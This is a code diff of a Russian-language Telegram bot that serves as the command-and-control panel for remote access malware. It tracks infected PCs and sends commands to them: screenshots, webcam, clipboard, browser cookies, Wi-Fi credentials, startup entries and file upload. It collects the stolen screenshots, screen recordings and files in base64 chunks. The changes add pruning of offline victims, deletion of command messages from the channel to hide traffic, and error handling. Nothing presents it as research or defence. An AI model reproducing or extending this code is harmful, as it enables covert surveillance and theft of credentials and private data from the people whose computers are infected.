@@ -267,7 +267,6 @@ async def show_devices_callback(callback: types.CallbackQuery):
     keyboard = []
     current_time = int(time.time())
     
-    # Подсчитываем количество устройств с одинаковыми именами
     name_count = {}
     for dev_id, name, last_seen, ip, os_info, first_seen in devices:
         name_count[name] = name_count.get(name, 0) + 1
@@ -276,7 +275,6 @@ async def show_devices_callback(callback: types.CallbackQuery):
         status_emoji = "🟢" if current_time - last_seen < 180 else "🔴"
         status_text = "Онлайн" if current_time - last_seen < 180 else "Оффлайн"
         
-        # Если есть несколько устройств с одинаковым именем, добавляем ID
         if name_count[name] > 1:
             display_name = f"{name} ({dev_id[:8]})"
         else:
@@ -290,6 +288,20 @@ async def show_devices_callback(callback: types.CallbackQuery):
     await callback.message.edit_text("🎛 **Список устройств из Базы Данных:**", 
                                    parse_mode="Markdown", 
                                    reply_markup=InlineKeyboardMarkup(inline_keyboard=keyboard))
+
+@dp.callback_query(F.data == "clean_offline")
+async def clean_offline(callback: types.CallbackQuery):
+    devices = get_all_devices()
+    current_time = int(time.time())
+    deleted = 0
+    
+    for dev_id, name, last_seen, ip, os_info, first_seen in devices:
+        if current_time - last_seen > 86400:
+            delete_device(dev_id)
+            deleted += 1
+    
+    await callback.answer(f"🗑 Удалено {deleted} оффлайн устройств")
+    await show_devices_callback(callback)
 
 @dp.callback_query(F.data == "global_stats")
 async def global_stats(callback: types.CallbackQuery):
@@ -429,7 +441,6 @@ async def send_command(callback: types.CallbackQuery):
     device_id = "_".join(parts[2:])
     
     cmd_map = {
-        # Мониторинг
         "screen": "screen",
         "webcam": "webcam",
         "tasklist": "tasklist",
@@ -437,7 +448,6 @@ async def send_command(callback: types.CallbackQuery):
         "apps": "apps",
         "clipboard": "clipboard",
         "video": "video",
-        # Системные
         "lock": "lock",
         "sleep": "sleep",
         "reboot": "reboot",
@@ -448,19 +458,16 @@ async def send_command(callback: types.CallbackQuery):
         "brightness50": "brightness:50",
         "brightness100": "brightness:100",
         "restart_explorer": "restart_explorer",
-        # Веб
         "yt": "yt",
         "google": "google",
         "maps": "maps",
         "twitch": "twitch",
         "msg": "msg",
-        # Утилиты
         "calc": "calc",
         "notepad": "notepad",
         "paint": "paint",
         "scr": "scr",
         "camera": "camera",
-        # Дополнительно
         "sysinfo": "sysinfo",
         "netinfo": "netinfo",
         "battery": "battery",
@@ -472,14 +479,12 @@ async def send_command(callback: types.CallbackQuery):
         "env": "env",
         "resolution": "resolution",
         "ports": "ports",
-        # Сбор данных
         "cookies": "cookies",
         "wifi": "wifi",
         "software": "software",
         "startup": "startup",
         "services": "services",
         "events": "events",
-        # Файлы
         "files": "files",
         "list_files": "list_files",
         "upload_file": "upload_file",
@@ -502,35 +507,57 @@ async def handle_channel_messages(message: types.Message):
     if not text:
         return
     
-    # INIT_START
-    if text.startswith("INIT_START:"):
+    # Удаляем команды из канала сразу после отправки
+    if text.startswith("CMD:") or text.startswith("UPLOAD_FILE:") or text.startswith("WALLPAPER_SET:"):
         try:
-            parts = text.split(":")
-            if len(parts) >= 3:
-                device_id = parts[1]
-                pc_name = parts[2]
-                ip_address = parts[3] if len(parts) > 3 else None
-                os_info = parts[4] if len(parts) > 4 else None
-                
-                update_device_in_db(device_id, pc_name, is_notified=0, ip_address=ip_address, os_info=os_info)
+            await message.delete()
+        except:
+            pass
+        return
+    
+    # LOG_REPLY - обрабатываем текстовые ответы от клиента и отправляем админу
+    if text.startswith("LOG_REPLY:"):
+        try:
+            text_data = text[10:]
+            
+            # Ищем устройство по имени
+            device_id = None
+            pc_name = None
+            for dev_id, name, last_seen, ip, os_info, first_seen in get_all_devices():
+                if name in text_data[:100]:
+                    device_id = dev_id
+                    pc_name = name
+                    break
+            
+            markup = get_device_menu(device_id) if device_id else None
+            
+            # Отправляем админу в личный чат
+            if len(text_data) > 4000:
+                for i in range(0, len(text_data), 4000):
+                    chunk = text_data[i:i+4000]
+                    await bot.send_message(
+                        chat_id=ADMIN_ID, 
+                        text=chunk, 
+                        parse_mode="Markdown", 
+                        reply_markup=markup if i == 0 else None
+                    )
+            else:
                 await bot.send_message(
-                    chat_id=ADMIN_ID,
-                    text=f"⚡️ **Новое устройство запущено!**\n"
-                         f"💻 Имя: `{pc_name}`\n"
-                         f"📡 IP: `{ip_address or 'Неизвестно'}`\n"
-                         f"🟢 Устройство сейчас активно.",
-                    parse_mode="Markdown",
-                    reply_markup=get_device_menu(device_id)
+                    chat_id=ADMIN_ID, 
+                    text=text_data, 
+                    parse_mode="Markdown", 
+                    reply_markup=markup
                 )
-                await message.delete()
+            
+            await message.delete()
         except Exception as e:
-            print(f"Error processing INIT_START: {e}")
+            print(f"Error processing LOG_REPLY: {e}")
         return
     
     # PING
     if text.startswith("PING:"):
         try:
-            parts = text.split(":")
+            parts = text.split(":", 3)
             if len(parts) >= 3:
                 device_id = parts[1]
                 pc_name = parts[2]
@@ -543,23 +570,22 @@ async def handle_channel_messages(message: types.Message):
                     update_device_in_db(device_id, pc_name, is_notified=1, ip_address=ip_address)
                     await bot.send_message(
                         chat_id=ADMIN_ID,
-                        text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`",
+                        text=f"🆕 **Зарегистрирован новый ПК:** `{pc_name}`\nID: `{device_id}`",
                         parse_mode="Markdown",
                         reply_markup=get_device_menu(device_id)
                     )
                 else:
                     last_seen = dev[1]
                     is_notified = dev[2]
-                    if current_time - last_seen >= 180 or is_notified == 0:
-                        update_device_in_db(device_id, pc_name, is_notified=1, ip_address=ip_address)
+                    update_device_in_db(device_id, pc_name, ip_address=ip_address)
+                    
+                    if current_time - last_seen >= 300:
                         await bot.send_message(
                             chat_id=ADMIN_ID,
                             text=f"🟢 **ПК `{pc_name}` снова на связи!**",
                             parse_mode="Markdown",
                             reply_markup=get_device_menu(device_id)
                         )
-                    else:
-                        update_device_in_db(device_id, pc_name, ip_address=ip_address)
                 
                 await message.delete()
         except Exception as e:
@@ -589,14 +615,20 @@ async def handle_channel_messages(message: types.Message):
                 full_base64 = "".join([screenshot_buffers[device_id][i] for i in range(total_parts)])
                 del screenshot_buffers[device_id]
                 
-                image_bytes = base64.b64decode(full_base64)
-                await bot.send_photo(
-                    chat_id=ADMIN_ID,
-                    photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
-                    caption=f"📸 **Скриншот с ПК:** `{pc_name}`",
-                    parse_mode="Markdown",
-                    reply_markup=get_device_menu(device_id)
-                )
+                try:
+                    image_bytes = base64.b64decode(full_base64)
+                    await bot.send_photo(
+                        chat_id=ADMIN_ID,
+                        photo=BufferedInputFile(image_bytes, filename="screenshot.jpg"),
+                        caption=f"📸 **Скриншот с ПК:** `{pc_name}`",
+                        parse_mode="Markdown",
+                        reply_markup=get_device_menu(device_id)
+                    )
+                except Exception as e:
+                    await bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"❌ Ошибка обработки скриншота с {pc_name}: {str(e)[:100]}"
+                    )
         except Exception as e:
             print(f"Error processing SCR_PART: {e}")
         return
@@ -611,27 +643,34 @@ async def handle_channel_messages(message: types.Message):
             part_num = int(part_num)
             total_parts = int(total_parts)
             
-            if device_id not in file_buffers:
-                file_buffers[device_id] = {}
+            key = f"video_{device_id}"
+            if key not in file_buffers:
+                file_buffers[key] = {}
                 
-            file_buffers[device_id][part_num] = base64_chunk
+            file_buffers[key][part_num] = base64_chunk
             await message.delete()
             
-            if len(file_buffers[device_id]) == total_parts:
+            if len(file_buffers[key]) == total_parts:
                 device_info = get_device(device_id)
                 pc_name = device_info[0] if device_info else "ПК"
                 
-                full_base64 = "".join([file_buffers[device_id][i] for i in range(total_parts)])
-                del file_buffers[device_id]
+                full_base64 = "".join([file_buffers[key][i] for i in range(total_parts)])
+                del file_buffers[key]
                 
-                file_bytes = base64.b64decode(full_base64)
-                await bot.send_video(
-                    chat_id=ADMIN_ID,
-                    video=BufferedInputFile(file_bytes, filename="screen_record.mp4"),
-                    caption=f"🎥 **Видео с экрана ПК:** `{pc_name}`",
-                    parse_mode="Markdown",
-                    reply_markup=get_device_menu(device_id)
-                )
+                try:
+                    file_bytes = base64.b64decode(full_base64)
+                    await bot.send_video(
+                        chat_id=ADMIN_ID,
+                        video=BufferedInputFile(file_bytes, filename="screen_record.mp4"),
+                        caption=f"🎥 **Видео с экрана ПК:** `{pc_name}`",
+                        parse_mode="Markdown",
+                        reply_markup=get_device_menu(device_id)
+                    )
+                except Exception as e:
+                    await bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"❌ Ошибка обработки видео с {pc_name}: {str(e)[:100]}"
+                    )
         except Exception as e:
             print(f"Error processing VIDEO_PART: {e}")
         return
@@ -646,7 +685,7 @@ async def handle_channel_messages(message: types.Message):
             part_num = int(part_num)
             total_parts = int(total_parts)
             
-            key = f"{device_id}_{filename}"
+            key = f"file_{device_id}_{filename}"
             if key not in file_buffers:
                 file_buffers[key] = {}
                 
@@ -660,17 +699,23 @@ async def handle_channel_messages(message: types.Message):
                 full_base64 = "".join([file_buffers[key][i] for i in range(total_parts)])
                 del file_buffers[key]
                 
-                file_bytes = base64.b64decode(full_base64)
-                save_file_to_db(device_id, filename, file_bytes)
-                
-                await bot.send_message(
-                    chat_id=ADMIN_ID,
-                    text=f"📁 **Получен файл с ПК:** `{pc_name}`\n"
-                         f"📄 Имя: `{filename}`\n"
-                         f"📦 Размер: {len(file_bytes) // 1024} KB",
-                    parse_mode="Markdown",
-                    reply_markup=get_device_menu(device_id)
-                )
+                try:
+                    file_bytes = base64.b64decode(full_base64)
+                    save_file_to_db(device_id, filename, file_bytes)
+                    
+                    await bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"📁 **Получен файл с ПК:** `{pc_name}`\n"
+                             f"📄 Имя: `{filename}`\n"
+                             f"📦 Размер: {len(file_bytes) // 1024} KB",
+                        parse_mode="Markdown",
+                        reply_markup=get_device_menu(device_id)
+                    )
+                except Exception as e:
+                    await bot.send_message(
+                        chat_id=ADMIN_ID,
+                        text=f"❌ Ошибка обработки файла с {pc_name}: {str(e)[:100]}"
+                    )
         except Exception as e:
             print(f"Error processing FILE_PART: {e}")
         return
@@ -693,68 +738,6 @@ async def handle_channel_messages(message: types.Message):
             await message.delete()
         except Exception as e:
             print(f"Error processing WALLPAPER_SET: {e}")
-        return
-    
-    # LOG_REPLY
-    if text.startswith("LOG_REPLY:"):
-        try:
-            text_data = text.replace("LOG_REPLY:", "")
-            
-            device_id = None
-            pc_name = None
-            for dev_id, name, last_seen, ip, os_info, first_seen in get_all_devices():
-                if name in text_data:
-                    device_id = dev_id
-                    pc_name = name
-                    break
-            
-            markup = get_device_menu(device_id) if device_id else None
-            
-            # Проверяем, является ли это ответом на команду сбора данных
-            if any(key in text_data for key in ["Wi-Fi", "ПО", "Автозагрузка", "Службы", "События", "Куки"]):
-                if len(text_data) > 4000:
-                    for i in range(0, len(text_data), 4000):
-                        chunk = text_data[i:i+4000]
-                        await bot.send_message(chat_id=ADMIN_ID, text=chunk, parse_mode="Markdown", 
-                                              reply_markup=markup if i == 0 else None)
-                else:
-                    await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", 
-                                          reply_markup=markup)
-                await message.delete()
-                return
-            
-            if "скриншот" in text_data.lower() or "screenshot" in text_data.lower():
-                if "base64:" in text_data:
-                    try:
-                        img_data = text_data.split("base64:")[1].strip()
-                        image_bytes = base64.b64decode(img_data)
-                        await bot.send_photo(
-                            chat_id=ADMIN_ID,
-                            photo=BufferedInputFile(image_bytes, filename="image.jpg"),
-                            caption=f"📸 Скриншот с ПК: `{pc_name or 'Неизвестно'}`",
-                            parse_mode="Markdown",
-                            reply_markup=markup
-                        )
-                        await message.delete()
-                        return
-                    except:
-                        pass
-            
-            if any(key in text_data for key in ["Информация о системе", "Сетевая информация", "Батарея", "Процессы", "дисках", "адаптеры", "переменные"]):
-                await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", reply_markup=markup)
-            else:
-                if len(text_data) > 4000:
-                    for i in range(0, len(text_data), 4000):
-                        chunk = text_data[i:i+4000]
-                        await bot.send_message(chat_id=ADMIN_ID, text=chunk, parse_mode="Markdown", 
-                                              reply_markup=markup if i == 0 else None)
-                else:
-                    await bot.send_message(chat_id=ADMIN_ID, text=text_data, parse_mode="Markdown", 
-                                          reply_markup=markup)
-            
-            await message.delete()
-        except Exception as e:
-            print(f"Error processing LOG_REPLY: {e}")
         return
 
 # --- ОБРАБОТКА ФАЙЛОВ ---
